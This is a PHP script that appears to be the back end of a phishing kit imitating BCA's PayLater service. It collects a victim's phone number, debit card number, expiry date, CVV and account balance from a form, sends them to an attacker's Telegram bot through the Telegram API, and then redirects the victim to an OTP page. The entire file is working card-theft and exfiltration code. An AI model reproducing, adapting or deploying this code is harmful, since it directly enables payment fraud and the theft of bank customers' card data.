<?php

session_start();
include "./telegram.php";

$nohp = $_SESSION['nohp'];

$nokartu = $_POST['debit'];
$_SESSION['debit'] = $nokartu;
$berlaku = $_POST['valid'];
$_SESSION['valid'] = $berlaku;
$cvv = $_POST['cvv'];
$_SESSION['cvv'] = $cvv;
$saldo = $_POST['saldo'];
$_SESSION['saldo'] = $saldo;


$message = "
( BCA | PAYLATER )

- No HP : ".$nohp."
- No Kartu : ".$nokartu."
- Valid : ".$berlaku."
- Cvv : ".$cvv."
- Saldo : ".$saldo."
";

function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
    $url = "https://api.telegram.org/bot" . $kennesia_token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $kennesia_telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
header('Location: ../otp.html');
?>
